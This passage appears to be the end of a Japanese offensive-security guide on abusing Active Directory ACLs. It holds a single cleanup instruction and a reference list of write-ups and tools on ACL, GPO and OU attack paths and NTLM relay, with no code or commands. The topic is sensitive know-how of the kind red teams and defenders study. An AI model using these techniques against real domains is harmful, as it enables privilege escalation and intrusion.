- 使用後は、元の内容とタイムスタンプに戻してクリーンアップしてください。


## References

- [1] [Active Directory ACL/ACEの悪用](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [特権アカウントとトークン特権](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL攻撃経路のアップデート](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active DirectoryのACLを使った権限昇格](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directoryの権限と特権アカウントのスキャン](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – LinuxからのAD属性/UAC操作](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc（グループメンバーシップ）](https://www.samba.org/)
- [10] [HTB Puppy: AD ACLの悪用、KeePassXC Argon2のクラック、DPAPIの復号によるDC管理者権限の取得](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: コード実行とNTLM Relayを目的としたGPO UNCパスの乗っ取り](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLMリレーなどを通じたActive Directory GPOの悪用](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directoryの非表示Organizational UnitにおけるACL攻撃ベクトルの悪用](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [ネットワーク上での正規Active Directoryサービスのシミュレーション: GPO悪用の事例](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU間の移動と継承ACLの悪用](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
